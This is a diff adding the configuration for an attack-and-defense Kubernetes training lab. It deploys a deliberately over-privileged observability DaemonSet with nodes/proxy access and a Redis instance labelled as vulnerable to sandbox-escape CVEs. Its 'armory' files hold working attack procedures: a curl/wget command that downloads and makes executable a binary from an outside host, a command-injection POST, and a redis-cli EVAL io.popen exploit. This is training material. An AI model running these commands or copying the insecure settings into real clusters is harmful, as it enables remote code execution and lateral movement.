@@ -1,0 +1,856 @@
+kind: playground
+name: k8s-adv-emulation-1b038ba5
+base: k8s-omni
+title: KubeCon EU'26 Attack and Defense
+description: A multi-node Kubernetes cluster provisioned with kubeadm, allowing you to choose your preferred container runtime and networking plugin. Perfect for CKA, CKAD, and CKS preparation.
+categories:
+    - kubernetes
+    - security
+playground:
+    networks:
+        - name: local
+          subnet: 172.16.0.0/24
+    machines:
+        - name: dev-machine
+          users:
+            - name: root
+            - name: laborant
+              default: true
+          drives:
+            - source: k8s-omni-dev-machine
+              mount: /
+              size: 30GiB
+          network:
+            interfaces:
+                - address: 172.16.0.5/24
+                  network: local
+          resources:
+            cpuCount: 2
+            ramSize: 4G
+          startupFiles:
+            - path: /home/laborant/manifests/entry-hall.yaml
+              content: |-
+                apiVersion: v1
+                kind: Namespace
+                metadata:
+                  name: dungeon
+                ---
+                apiVersion: v1
+                kind: ServiceAccount
+                metadata:
+                  name: player
+                  namespace: dungeon
+                ---
+                apiVersion: v1
+                kind: Pod
+                metadata:
+                  name: entry-hall
+                  namespace: dungeon
+                  labels:
+                    role: entrance
+                    kubescape.io/user-defined-profile: apprentice
+                spec:
+                  serviceAccountName: player
+                  containers:
+                  - name: shell
+                    image: nginx:latest
+                    command: ["/bin/sh", "-c", "--"]
+                    args: ["while true; do sleep 30; done;"]
+                    securityContext:
+                      privileged: false
+                    volumeMounts:
+                    - name: proc-host
+                      mountPath: /host/proc
+                      readOnly: true
+                  volumes:
+                  - name: proc-host
+                    hostPath:
+                      path: /proc
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+            - path: /home/laborant/armory/drop-ran-ws-bin
+              content: "name: Drop Ran-WS Binary\ndescription: Downloads a binary from the provided source to a system\ntactic: Execution\ntechniques: [\"User Execution\"]\nparameters:\n  URL:\n    type: string\n    default: https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ran-ws\n    description: the url from where to download the binary\n  DST_BIN:\n    type: string\n    default: /tmp/ran-ws\n    description: the destination path of the binary at the remote system\nprocedures:\n  - key: curl\n    command: curl -sS -L ${URL} -o ${DST_BIN} && chmod +x ${DST_BIN} \n  - key: wget\n    command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} \npreconditions:\n  kind: System\n  accessLevel: \"user-exec\"\neffects: [\"sys.has-binary(${DST_BIN})\"]"
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+            - path: /home/laborant/manifests/oops.yaml
+              content: |+
+                # daemonset.yaml — Deploys the Oopservability agent on every node.
+                #
+                # The DaemonSet pattern is common for observability agents (Datadog, Falco,
+                # Fluentd, Node Exporter).  Running on every node makes the attack surface
+                # cluster-wide — compromise one pod, compromise the whole node fleet.
+
+                apiVersion: v1
+                kind: Namespace
+                metadata:
+                  name: oopservability
+                  labels:
+                    # Label for easy cleanup: kubectl delete ns oopservability
+                    app.kubernetes.io/name: oopservability
+                    app.kubernetes.io/component: tutorial
+                ---
+                apiVersion: apps/v1
+                kind: DaemonSet
+                metadata:
+                  name: oopservability-agent
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: oopservability
+                    app.kubernetes.io/component: agent
+                spec:
+                  selector:
+                    matchLabels:
+                      app.kubernetes.io/name: oopservability
+                  template:
+                    metadata:
+                      labels:
+                        app.kubernetes.io/name: oopservability
+                        app.kubernetes.io/component: agent
+                    spec:
+                      serviceAccountName: oopservability-agent
+                      containers:
+                        - name: agent
+                          image: ghcr.io/magier/oopservability:latest
+                          imagePullPolicy: Always
+                          ports:
+                            - name: http
+                              containerPort: 8080
+                              protocol: TCP
+                          env:
+                            # Expose node name so the agent can build kubelet proxy URLs.
+                            # This is standard practice for DaemonSets.
+                            - name: NODE_NAME
+                              valueFrom:
+                                fieldRef:
+                                  fieldPath: spec.nodeName
+                            - name: POD_NAMESPACE
+                              valueFrom:
+                                fieldRef:
+                                  fieldPath: metadata.namespace
+                            - name: PORT
+                              value: "8080"
+                          resources:
+                            requests:
+                              cpu: 20m
+                              memory: 32Mi
+                            limits:
+                              cpu: 200m
+                              memory: 128Mi
+                          # The SA token is automatically mounted at:
+                          #   /var/run/secrets/kubernetes.io/serviceaccount/token
+                          # Do NOT set automountServiceAccountToken: false — that is the point.
+                          volumeMounts:
+                            - name: varlog
+                              mountPath: /var/log
+                              readOnly: true   # agent only reads logs ... supposedly
+                          livenessProbe:
+                            httpGet:
+                              path: /healthz
+                              port: 8080
+                            initialDelaySeconds: 5
+                            periodSeconds: 30
+                          readinessProbe:
+                            httpGet:
+                              path: /healthz
+                              port: 8080
+                            initialDelaySeconds: 3
+                            periodSeconds: 10
+
+                      volumes:
+                        # Mount host /var/log so the log search endpoint has something to grep.
+                        - name: varlog
+                          hostPath:
+                            path: /var/log
+                            type: Directory
+
+                      tolerations:
+                        # Run on control-plane nodes too — interesting for tutorial purposes.
+                        - key: node-role.kubernetes.io/control-plane
+                          operator: Exists
+                          effect: NoSchedule
+                        - key: node-role.kubernetes.io/master
+                          operator: Exists
+                          effect: NoSchedule
+
+                ---
+                # Optional: expose the agent on every node via a NodePort for easy access
+                # during the tutorial (not for production use).
+                apiVersion: v1
+                kind: Service
+                metadata:
+                  name: oopservability-agent
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: oopservability
+                spec:
+                  selector:
+                    app.kubernetes.io/name: oopservability
+                  ports:
+                    - name: http
+                      port: 8080
+                      targetPort: 8080
+                  type: ClusterIP
+                ---
+                # rbac.yaml — Service account and RBAC for the Oopservability agent.
+                #
+                # ┌─────────────────────────────────────────────────────────────────────────┐
+                # │  THE DANGEROUS PERMISSION                                               │
+                # │                                                                         │
+                # │  resources: ["nodes/proxy"]                                             │
+                # │  verbs:     ["get"]                                                     │
+                # │                                                                         │
+                # │  At first glance this looks safe:  read-only, scoped to nodes, needed  │
+                # │  to scrape kubelet /metrics.  In practice it is a transparent HTTP     │
+                # │  tunnel to the kubelet API (port 10250) on every node.                 │
+                # │                                                                         │
+                # │  The kubelet API trusts the API server to have already authorised the  │
+                # │  caller, so any holder of this SA token can:                           │
+                # │                                                                         │
+                # │    • List all pods on the node   GET  /pods                            │
+                # │    • Run commands in any pod     POST /run/<ns>/<pod>/<ctr>            │
+                # │    • Read kubelet config         GET  /configz                         │
+                # │    • Fetch node-level metrics    GET  /metrics                         │
+                # │    • Get container logs          GET  /containerLogs/<ns>/<pod>/<ctr>  │
+                # └─────────────────────────────────────────────────────────────────────────┘
+
+                ---
+                apiVersion: v1
+                kind: ServiceAccount
+                metadata:
+                  name: oopservability-agent
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: oopservability
+                automountServiceAccountToken: true   # default true — token is mounted into the pod
+
+                ---
+                apiVersion: rbac.authorization.k8s.io/v1
+                kind: ClusterRole
+                metadata:
+                  name: oopservability-agent
+                  labels:
+                    app.kubernetes.io/name: oopservability
+                rules:
+                  # ── The permission that makes this dangerous ─────────────────────────────
+                  # nodes/proxy: transparent HTTP tunnel to the kubelet API.
+                  # GET is all you need to reach /run (exec), /pods, /configz, /metrics, etc.
+                  - apiGroups: [""]
+                    resources: ["nodes/proxy"]
+                    verbs: ["get"]
+
+                  # ── Standard read permissions an observability agent might legitimately need
+                  - apiGroups: [""]
+                    resources: ["nodes", "pods", "namespaces"]
+                    verbs: ["get", "list", "watch"]
+
+                ---
+                apiVersion: rbac.authorization.k8s.io/v1
+                kind: ClusterRoleBinding
+                metadata:
+                  name: oopservability-agent
+                  labels:
+                    app.kubernetes.io/name: oopservability
+                roleRef:
+                  apiGroup: rbac.authorization.k8s.io
+                  kind: ClusterRole
+                  name: oopservability-agent
+                subjects:
+                  - kind: ServiceAccount
+                    name: oopservability-agent
+                    namespace: oopservability
+
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+            - path: /home/laborant/manifests/oops_redis.yaml
+              content: |-
+                # Redis 7.2.10 — vulnerable to CVE-2025-49844 + CVE-2022-0543
+                #
+                # CVE-2025-49844: Use-After-Free in Lua parser lparser.c (all Redis < 7.2.11)
+                # CVE-2022-0543: Lua sandbox escape via package.loadlib (Debian packaging issue)
+                #
+                # This uses a custom image built from Dockerfile.redis-vulnerable that patches
+                # the Lua sandbox to reproduce the CVE-2022-0543 condition, enabling full
+                # sandbox escape via EVAL → package.loadlib → io.popen → shell.
+                #
+                # Deploys into its own "redis" namespace with:
+                #   Namespace, ServiceAccount, Role, RoleBinding, Deployment, Service
+                #
+                # Apply:  kubectl apply -f redis-vulnerable.yaml
+                # Verify: kubectl -n redis get pods
+                # Test:   kubectl -n redis exec deploy/redis -- redis-cli PING
+
+                apiVersion: v1
+                kind: ServiceAccount
+                metadata:
+                  name: redis
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: redis
+                ---
+                apiVersion: rbac.authorization.k8s.io/v1
+                kind: ClusterRole
+                metadata:
+                  name: node-proxy-reader
+                rules:
+                - apiGroups: [""]
+                  resources: ["nodes/proxy"]
+                  verbs: ["get"]
+                - apiGroups: [""]
+                  resources: ["nodes/pods"]
+                  verbs: ["get"]
+                - apiGroups: [""]
+                  resources: ["pods"]
+                  verbs: ["get", "list"]
+                ---
+                apiVersion: rbac.authorization.k8s.io/v1
+                kind: ClusterRoleBinding
+                metadata:
+                  name: redis-binding
+                subjects:
+                - kind: ServiceAccount
+                  name: redis
+                  namespace: oopservability
+                roleRef:
+                  kind: ClusterRole
+                  name: node-proxy-reader
+                  apiGroup: rbac.authorization.k8s.io
+                ---
+                apiVersion: v1
+                kind: ConfigMap
+                metadata:
+                  name: redis-config
+                  namespace: oopservability
+                data:
+                  redis.conf: |
+                    # Disable protected mode (no auth, no bind restriction)
+                    protected-mode no
+                    bind 0.0.0.0
+                    port 6379
+
+                    # Persistence off — ephemeral for testing
+                    save ""
+                    appendonly no
+
+                    # Memory limit
+                    maxmemory 256mb
+                    maxmemory-policy allkeys-lru
+
+                    # Logging
+                    loglevel notice
+                ---
+                apiVersion: apps/v1
+                kind: Deployment
+                metadata:
+                  name: redis
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: redis
+                    app.kubernetes.io/version: "7.2.10"
+                    cve: CVE-2025-49844
+                spec:
+                  replicas: 1
+                  selector:
+                    matchLabels:
+                      app.kubernetes.io/name: redis
+                  template:
+                    metadata:
+                      labels:
+                        app.kubernetes.io/name: redis
+                        app.kubernetes.io/version: "7.2.10"
+                    spec:
+                      serviceAccountName: redis
+                      containers:
+                        - name: redis
+                          # image: ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10
+                          image: ghcr.io/k8sstormcenter/redis-vulnerable:latest
+                          command: ["redis-server", "/etc/redis/redis.conf"]
+                          ports:
+                            - containerPort: 6379
+                              name: redis
+                              protocol: TCP
+                          volumeMounts:
+                            - name: config
+                              mountPath: /etc/redis
+                              readOnly: true
+                          resources:
+                            requests:
+                              cpu: 250m
+                              memory: 256Mi
+                            limits:
+                              cpu: "1"
+                              memory: 512Mi
+                          livenessProbe:
+                            exec:
+                              command: ["redis-cli", "ping"]
+                            initialDelaySeconds: 5
+                            periodSeconds: 10
+                          readinessProbe:
+                            exec:
+                              command: ["redis-cli", "ping"]
+                            initialDelaySeconds: 3
+                            periodSeconds: 5
+                      volumes:
+                        - name: config
+                          configMap:
+                            name: redis-config
+                ---
+                apiVersion: v1
+                kind: Service
+                metadata:
+                  name: redis
+                  namespace: oopservability
+                  labels:
+                    app.kubernetes.io/name: redis
+                spec:
+                  type: ClusterIP
+                  selector:
+                    app.kubernetes.io/name: redis
+                  ports:
+                    - port: 6379
+                      targetPort: 6379
+                      protocol: TCP
+                      name: redis
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+            - path: /home/laborant/armory/exploit-oops.yaml
+              content: "name: Exploit Ooops RCE\ndescription: Exploit the intentionally introduced RCE vulnerability in the Ooopservability service to execute arbitrary commands on the target system.\ntactic: Lateral Movement\ntechniques: [\"Exploitation of Remote Services\", \"T1210\"]\nparameters:\n  TARGET:\n    type: string\n    default: ${TARGET.IP}\n    description: the DNS name or IP address of the Ooopservability service\n  PORT:\n    type: int\n    default: 8080\n    description: the port on which the Ooopservability service is running\n  CMD:\n    type: string\n    default: id\n    description: the command to execute on the target system\nprocedures:\n  - key: curl\n    command: |\n      curl -s -X POST http://${TARGET}:${PORT}/api/v1/diagnostics/run \n        -H 'Content-Type: application/json' \n        -d '{\"command\":\"${CMD}\"}'\npreconditions:\n  kind: System\nenvelope: \neffects: [\"rce.can-exec(${SRC}, ${TARGET})\"]\n"
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+            - path: /home/laborant/armory/exploit-cve-2022-0543.yaml
+              content: "name: Exploit Redis CVE-2022-0543\ndescription: Exploit the CVE-2022-0543 vulnerability in Redis to execute arbitrary commands on the target system.\ntactic: Lateral Movement\ntechniques: [\"Exploitation of Remote Services\", \"T1210\"]\nstatus: enabled\nparameters:\n  TARGET:\n    type: string\n    default: ${TARGET.IP}\n    description: the DNS name or IP address of the Redis service\n  PORT:\n    type: int\n    default: 6379\n    description: the port on which the Redis service is running\n  CMD:\n    type: string\n    default: id\n    description: the command to execute on the target system\nprocedures:\n  - key: exec-cmd\n    tool: redis-cli\n    command: |\n      redis-cli -h ${TARGET} -p ${PORT} EVAL \"local cmd = ARGV[1] .. ' 2>&1'; local f = io.popen(cmd); local d = f:read('*a') f:close(); return d;\" 0 \"${CMD}\"\npreconditions:\n  kind: System\n  # has-binary: redis-cli\nenvelope: \neffects: [\"rce.can-exec(${SRC}, ${TARGET})\"]"
+              mode: "644"
+              owner: laborant:laborant
+              append: false
+        - name: cplane-01
+          users:
+            - name: root
+            - name: laborant
+              default: true
+          drives:
+            - source: k8s-omni-cplane
+              mount: /
+              size: 30GiB
+          network:
+            interfaces:
+                - address: 172.16.0.2/24
+                  network: local
+          resources:
+            cpuCount: 4
+            ramSize: 4G
+    tabs:
+        - id: ide-dev-machine
+          kind: ide
+          name: IDE
+          machine: dev-machine
+        - id: kexp-dev-machine
+          kind: kexp
+          name: Explorer
+          machine: dev-machine
+        - id: terminal-dev-machine
+          kind: terminal
+          name: dev-machine
+          machine: dev-machine
+        - id: terminal-cplane-01
+          kind: terminal
+          name: cplane-01
+          machine: cplane-01
+        - id: http-port-08oi77oy93tw
+          kind: http-port
+          name: RanUI
+          machine: dev-machine
+          number: 8080
+          access: private
+    initTasks:
+        init_cplane_00_configure_cni:
+            name: init_cplane_00_configure_cni
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            run: |-
+                cat > /etc/cni/net.d/99-loopback.conf <<EOF
+                {
+                  "cniVersion": "1.1.0",
+                  "name": "lo",
+                  "type": "loopback"
+                }
+                EOF
+
+                cat > /etc/cni/net.d/10-bridge.conf <<EOF
+                {
+                  "cniVersion": "1.0.0",
+                  "name": "bridge",
+                  "type": "bridge",
+                  "bridge": "cni0",
+                  "isGateway": true,
+                  "ipMasq": true,
+                  "ipam": {
+                    "type": "host-local",
+                    "ranges": [
+                      [{"subnet": "10.244.0.0/24"}]
+                    ],
+                    "routes": [{"dst": "0.0.0.0/0"}]
+                  }
+                }
+                EOF
+            conditions:
+                - key: Networking plugin
+                  value: static
+        init_cplane_00_configure_routes:
+            name: init_cplane_00_configure_routes
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            run: |-
+                ip route add 10.244.1.0/24 via 172.16.0.3  # node-01
+                ip route add 10.244.2.0/24 via 172.16.0.4  # node-02
+            conditions:
+                - key: Networking plugin
+                  value: static
+        init_cplane_10_containerd_install:
+            name: init_cplane_10_containerd_install
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_00_configure_cni
+                - init_cplane_00_configure_routes
+            run: |-
+                mv /opt/iximiuz-labs/containerd/containerd.service /etc/systemd/system/containerd.service
+
+                chmod +x /opt/iximiuz-labs/containerd/bin/*
+                mv /opt/iximiuz-labs/containerd/bin/* /usr/local/bin
+
+                mkdir -p /etc/containerd
+                cat <<EOF > /etc/containerd/config.toml
+                version = 2
+
+                [plugins."io.containerd.grpc.v1.cri"]
+                  [plugins."io.containerd.grpc.v1.cri".containerd]
+                    snapshotter = "overlayfs"
+                    default_runtime_name = "runc"
+                  [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
+                    runtime_type = "io.containerd.runc.v2"
+                  [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
+                    SystemdCgroup = true
+                [plugins."io.containerd.grpc.v1.cri".cni]
+                  bin_dir = "/opt/cni/bin"
+                  conf_dir = "/etc/cni/net.d"
+                EOF
+
+                systemctl daemon-reload
+                systemctl enable --now containerd
+            conditions:
+                - key: Container runtime
+                  value: containerd
+        init_cplane_10_cri_o_install:
+            name: init_cplane_10_cri_o_install
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_00_configure_cni
+                - init_cplane_00_configure_routes
+            run: |-
+                apt-get update
+                cp -r /opt/iximiuz-labs/apt-cache/* /var/cache/apt/archives/
+                apt-get install -y cri-o podman
+
+                systemctl daemon-reload
+                systemctl enable --now crio
+            conditions:
+                - key: Container runtime
+                  value: cri-o
+        init_cplane_15_containerd_load_images:
+            name: init_cplane_15_containerd_load_images
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_10_containerd_install
+            run: |-
+                for i in $(ls /opt/iximiuz-labs/images); do
+                  ctr -n k8s.io images import "/opt/iximiuz-labs/images/$i"
+                done
+
+                rm -rf /opt/iximiuz-labs/images
+            conditions:
+                - key: Container runtime
+                  value: containerd
+        init_cplane_15_cri_o_load_images:
+            name: init_cplane_15_cri_o_load_images
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_10_cri_o_install
+            run: |-
+                for i in $(ls /opt/iximiuz-labs/images); do
+                  podman load -i "/opt/iximiuz-labs/images/$i"
+                done
+
+                rm -rf /opt/iximiuz-labs/images
+            conditions:
+                - key: Container runtime
+                  value: cri-o
+        init_cplane_20_kubeadm_init:
+            name: init_cplane_20_kubeadm_init
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_15_containerd_load_images
+                - init_cplane_15_cri_o_load_images
+            run: kubeadm init --pod-network-cidr=10.244.0.0/16
+        init_cplane_30_place_kubeconfig:
+            name: init_cplane_30_place_kubeconfig
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_20_kubeadm_init
+            run: |-
+                mkdir /root/.kube
+                ln -s /etc/kubernetes/admin.conf /root/.kube/config
+
+                mkdir /home/laborant/.kube
+                cp /etc/kubernetes/admin.conf /home/laborant/.kube/config
+                chown -R laborant:laborant /home/laborant/.kube
+        init_cplane_40_taint:
+            name: init_cplane_40_taint
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_30_place_kubeconfig
+            run: kubectl taint node cplane-01 node-role.kubernetes.io/control-plane:NoSchedule-
+        init_cplane_50_calico_crds:
+            name: init_cplane_50_calico_crds
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_50_calico_operator
+            run: |-
+                curl -s https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/custom-resources.yaml | \
+                yq eval 'select(.kind == "Installation") | .spec.calicoNetwork.ipPools[] |= (.cidr = "10.244.0.0/16")' - | \
+                kubectl apply -f -
+
+                curl -s https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/custom-resources.yaml | \
+                yq eval 'select(.kind != "Installation")' - | \
+                kubectl apply -f -
+            conditions:
+                - key: Networking plugin
+                  value: calico
+        init_cplane_50_calico_operator:
+            name: init_cplane_50_calico_operator
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_40_taint
+            run: 'kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/tigera-operator.yaml                '
+            conditions:
+                - key: Networking plugin
+                  value: calico
+        init_cplane_50_cilium:
+            name: init_cplane_50_cilium
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_40_taint
+            run: |-
+                CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
+                CLI_ARCH=amd64
+                if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi
+
+                curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
+                sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
+                tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
+                rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
+
+                cilium install
+            conditions:
+                - key: Networking plugin
+                  value: cilium
+        init_cplane_50_flannel:
+            name: init_cplane_50_flannel
+            machine: cplane-01
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_cplane_40_taint
+            run: kubectl apply -f https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml
+            conditions:
+                - key: Networking plugin
+                  value: flannel
+        init_dev_machine_10_place_kubeconfig:
+            name: init_dev_machine_10_place_kubeconfig
+            machine: dev-machine
+            init: true
+            user: root
+            timeout_seconds: 300
+            run: |-
+                mkdir -p /root/.kube
+                scp -o StrictHostKeyChecking=no cplane-01:/etc/kubernetes/admin.conf /root/.kube/config
+
+                mkdir -p /home/laborant/.kube
+                cp /root/.kube/config /home/laborant/.kube/config
+                chown -R laborant:laborant /home/laborant/.kube
+        init_dev_machine_20_install_cilium:
+            name: init_dev_machine_20_install_cilium
+            machine: dev-machine
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_dev_machine_10_place_kubeconfig
+            run: |-
+                CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
+                CLI_ARCH=amd64
+                if [ "$(uname -m)" = "aarch64" ]; then CLI_ARCH=arm64; fi
+
+                curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
+                sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
+                tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
+                rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
+            conditions:
+                - key: Networking plugin
+                  value: cilium
+        init_dev_machine_30_apply_manifests:
+            name: init_dev_machine_30_apply_manifests
+            machine: dev-machine
+            init: true
+            user: laborant
+            timeout_seconds: 300
+            needs:
+                - init_dev_machine_10_place_kubeconfig
+            run: |-
+                MANIFEST_DIR=$HOME/manifests
+
+                echo "Waiting for Kubernetes API..."
+                until kubectl get nodes >/dev/null 2>&1; do sleep 2; done
+
+
+                if find "$MANIFEST_DIR" -type f \( -name '*.yaml' -o -name '*.yml' \) | grep -q .; then
+                  echo "Applying Kubernetes manifests..."
+                  kubectl apply -f "$MANIFEST_DIR"
+                else
+                  echo "No manifests found in $MANIFEST_DIR — skipping apply"
+                fi
+
+
+                echo "Waiting for Kubernetes API..."
+                until kubectl get nodes >/dev/null 2>&1; do sleep 2; done
+
+                echo "Waiting for deployments..."
+                kubectl get deployments -A --no-headers \
+                | awk '{print $1, $2}' \
+                | while read ns name; do
+                  echo "→ $ns / $name"
+                  kubectl rollout status deployment "$name" -n "$ns" --timeout=180s
+                done
+
+                echo "Waiting for statefulsets..."
+                kubectl get statefulsets -A --no-headers \
+                | awk '{print $1, $2}' \
+                | while read ns name; do
+                  echo "→ $ns / $name"
+                  kubectl rollout status statefulset "$name" -n "$ns" --timeout=180s
+                done
+        init_dev_machine_30_install_argocd:
+            name: init_dev_machine_30_install_argocd
+            machine: dev-machine
+            init: true
+            user: root
+            timeout_seconds: 300
+            run: |
+                kubectl create namespace argocd
+                kubectl apply -n argocd --server-side --force-conflicts -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
+        init_dev_machine_30_install_ran:
+            name: init_dev_machine_30_install_ran
+            machine: dev-machine
+            init: true
+            user: root
+            timeout_seconds: 300
+            run: |-
+                TMP=/tmp/ran.tar.gz
+                RAN_DIR=/usr/local/bin
+                curl -L https://github.com/magier/ran/releases/latest/download/ran-linux-amd64.tar.gz -o $TMP
+                echo "unpacking Ran into $RAN_DIR/ran"
+                tar -xzvf "$TMP" -C "$RAN_DIR"
+                #rm $TMP
+                chmod +x "$RAN_DIR/ran"
+
+                cat <<EOF >/etc/systemd/system/ran-ui.service
+                [Unit]
+                Description=Ran UI Emulator
+                After=network.target
+
+                [Service]
+                Type=simple
+
+                User=laborant
+                # wait until files and API server are ready
+                ExecStartPre=/bin/bash -c 'until test -x "$RAN_DIR/ran"; do sleep 2; done'
+                ExecStartPre=/bin/bash -c 'until test -f /home/laborant/.kube/config; do sleep 2; done'
+                ExecStartPre=/bin/bash -c 'until kubectl get nodes >/dev/null 2>&1; do sleep 2; done'
+
+                ExecStart=$RAN_DIR/ran emulate --armory /home/laborant/armory
+                Restart=on-failure
+                RestartSec=5
+
+                [Install]
+                WantedBy=multi-user.target
+                EOF
+        init_dev_machine_50_start_ran:
+            name: init_dev_machine_50_start_ran
+            machine: dev-machine
+            init: true
+            user: root
+            timeout_seconds: 300
+            needs:
+                - init_dev_machine_30_apply_manifests
+                - init_dev_machine_30_install_ran
+                - init_dev_machine_10_place_kubeconfig
+            run: systemctl start ran-ui
+    initConditions:
+        values:
+            - key: Networking plugin
+              default: cilium
+              nullable: true
+              options:
+                - calico
+                - cilium
+                - flannel
+                - static
+            - key: Container runtime
+              default: containerd
+              options:
+                - containerd
+                - cri-o
+    accessControl:
+        canList:
+            - anyone
+        canRead:
+            - anyone
+        canStart:
+            - anyone
